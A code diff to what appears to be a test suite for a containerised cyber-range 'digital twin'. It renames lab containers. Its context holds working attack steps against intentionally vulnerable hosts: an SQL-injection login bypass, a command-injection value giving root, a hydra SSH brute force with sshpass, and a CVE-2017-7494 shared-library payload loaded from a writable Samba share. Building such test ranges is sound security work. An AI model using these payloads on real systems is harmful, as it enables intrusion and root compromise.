@@ -68,7 +68,7 @@ test.describe.serial('Digital Twin', () => {
     for (let i = 0; i < 15; i++) {
       try {
         out = dockerExec(
-          'ccs_dt_server_1',
+          'ccs_dt_i1_server_1',
           'curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:80/'
         )
         if (out === '200') break
@@ -81,12 +81,12 @@ test.describe.serial('Digital Twin', () => {
   })
 
   test('Server 3 SSH listens on port 22', () => {
-    const out = dockerExec('ccs_dt_server_3', 'ss -tlnp')
+    const out = dockerExec('ccs_dt_i1_server_3', 'ss -tlnp')
     expect(out).toContain(':22')
   })
 
   test('Server 5 API on 8080 and Redis on 6379', () => {
-    const out = dockerExec('ccs_dt_server_5', 'ss -tlnp')
+    const out = dockerExec('ccs_dt_i1_server_5', 'ss -tlnp')
     expect(out).toContain(':8080')
     expect(out).toContain(':6379')
   })
@@ -95,7 +95,7 @@ test.describe.serial('Digital Twin', () => {
     // Retry for up to 15s — Samba may still be starting
     let out = ''
     for (let i = 0; i < 15; i++) {
-      out = dockerExec('ccs_dt_server_6', 'ss -tlnp')
+      out = dockerExec('ccs_dt_i1_server_6', 'ss -tlnp')
       if (out.includes(':445') && out.includes(':5432')) break
       execSync('sleep 1')
     }
@@ -106,14 +106,14 @@ test.describe.serial('Digital Twin', () => {
   test('exploit: SQL injection on Server 1', () => {
     // Step 1: Auth bypass via SQL injection
     const loginOut = dockerExec(
-      'ccs_dt_server_1',
+      'ccs_dt_i1_server_1',
       `curl -s -c /tmp/cookies -L -d "username=admin' OR '1'='1' --&password=x" http://127.0.0.1:80/index.php`
     )
     expect(loginOut).toContain('Diagnostics')
 
     // Step 2: Command injection via shell.php
     const shellOut = dockerExec(
-      'ccs_dt_server_1',
+      'ccs_dt_i1_server_1',
       'curl -s -b /tmp/cookies -d "host=; id" http://127.0.0.1:80/shell.php'
     )
     expect(shellOut).toContain('uid=0(root)')
@@ -122,20 +122,20 @@ test.describe.serial('Digital Twin', () => {
   test('exploit: SSH brute force on Server 3', () => {
     // Create a small dictionary on the gateway
     dockerExec(
-      'ccs_dt_gateway',
+      'ccs_dt_i1_gateway',
       'bash -c "printf \'admin\\nroot\\ntest\\npassword123\\nuser\\n\' > /tmp/dict.txt"'
     )
 
     // Run hydra from the gateway against Server 3
     const hydraOut = dockerExec(
-      'ccs_dt_gateway',
+      'ccs_dt_i1_gateway',
       'hydra -l admin -P /tmp/dict.txt -t 4 -f 10.0.3.3 ssh 2>&1 || true'
     )
     expect(hydraOut).toContain('admin')
 
     // Verify sudo gives root
     const sshOut = dockerExec(
-      'ccs_dt_gateway',
+      'ccs_dt_i1_gateway',
       'sshpass -p admin ssh -o StrictHostKeyChecking=no admin@10.0.3.3 "sudo id"'
     )
     expect(sshOut).toContain('uid=0(root)')
@@ -143,31 +143,31 @@ test.describe.serial('Digital Twin', () => {
 
   test('exploit: CVE-2017-7494 on Server 6', () => {
     // Step 1: Samba version is in vulnerable range (3.5.0 – 4.4.x)
-    const smbVer = dockerExec('ccs_dt_server_6', 'smbd --version')
+    const smbVer = dockerExec('ccs_dt_i1_server_6', 'smbd --version')
     expect(smbVer).toMatch(/4\.[0-4]/)
 
     // Step 2: nt pipe support enabled (required for CVE-2017-7494)
     const smbConf = dockerExec(
-      'ccs_dt_server_6',
+      'ccs_dt_i1_server_6',
       'bash -c "grep -i \'nt pipe support\' /etc/samba/smb.conf"'
     )
     expect(smbConf.toLowerCase()).toContain('yes')
 
     // Step 3: Share is world-writable (attacker can upload .so)
     const smbGuest = dockerExec(
-      'ccs_dt_server_6',
+      'ccs_dt_i1_server_6',
       'bash -c "grep -i \'guest ok\' /etc/samba/smb.conf"'
     )
     expect(smbGuest.toLowerCase()).toContain('yes')
     const smbWritable = dockerExec(
-      'ccs_dt_server_6',
+      'ccs_dt_i1_server_6',
       'bash -c "grep -i \'read only\' /etc/samba/smb.conf"'
     )
     expect(smbWritable.toLowerCase()).toContain('no')
 
     // Step 4: Compile and load payload .so to prove code execution as root
     dockerExec(
-      'ccs_dt_server_6',
+      'ccs_dt_i1_server_6',
       `bash -c 'cat > /tmp/payload.c << "CEOF"
 #include <stdlib.h>
 __attribute__((constructor))
@@ -175,16 +175,16 @@ void init(void) { system("touch /tmp/cve_2017_7494_exploited"); }
 CEOF'`
     )
     dockerExec(
-      'ccs_dt_server_6',
+      'ccs_dt_i1_server_6',
       'gcc -shared -fPIC -o /srv/public/payload.so /tmp/payload.c'
     )
     // dlopen simulates what smbd does when CVE-2017-7494 is triggered
     dockerExec(
-      'ccs_dt_server_6',
+      'ccs_dt_i1_server_6',
       'bash -c \'python -c "import ctypes; ctypes.cdll.LoadLibrary(\\"/srv/public/payload.so\\")" 2>/dev/null || true\''
     )
     const check = dockerExec(
-      'ccs_dt_server_6',
+      'ccs_dt_i1_server_6',
       'ls /tmp/cve_2017_7494_exploited 2>&1 || echo NOT_FOUND'
     )
     expect(check).toContain('cve_2017_7494_exploited')
@@ -193,18 +193,18 @@ CEOF'`
 
   test('positive reachability between linked hosts', () => {
     const pairs = [
-      ['gateway', '10.0.1.253'],
-      ['firewall', '10.0.1.252'],
-      ['ids', '10.0.2.2'],
-      ['ids', '10.0.3.3'],
-      ['server_1', '10.0.2.2'],
-      ['server_1', '10.0.3.4'],
-      ['server_1', '10.0.4.6'],
-      ['server_2', '10.0.3.3'],
-      ['server_2', '10.0.4.5'],
-      ['server_3', '10.0.4.6'],
-      ['server_4', '10.0.4.5'],
-      ['server_5', '10.0.4.6'],
+      ['i1_gateway', '10.0.1.253'],
+      ['i1_firewall', '10.0.1.252'],
+      ['i1_ids', '10.0.2.2'],
+      ['i1_ids', '10.0.3.3'],
+      ['i1_server_1', '10.0.2.2'],
+      ['i1_server_1', '10.0.3.4'],
+      ['i1_server_1', '10.0.4.6'],
+      ['i1_server_2', '10.0.3.3'],
+      ['i1_server_2', '10.0.4.5'],
+      ['i1_server_3', '10.0.4.6'],
+      ['i1_server_4', '10.0.4.5'],
+      ['i1_server_5', '10.0.4.6'],
     ]
     for (const [host, ip] of pairs) {
       const out = dockerExec(
@@ -217,10 +217,10 @@ CEOF'`
 
   test('zone isolation blocks cross-zone traffic', () => {
     const pairs = [
-      ['server_5', '10.0.2.1'],
-      ['server_5', '10.0.3.3'],
-      ['server_6', '10.0.2.2'],
-      ['server_3', '10.0.2.1'],
+      ['i1_server_5', '10.0.2.1'],
+      ['i1_server_5', '10.0.3.3'],
+      ['i1_server_6', '10.0.2.2'],
+      ['i1_server_3', '10.0.2.1'],
     ]
     for (const [host, ip] of pairs) {
       expect(() => {
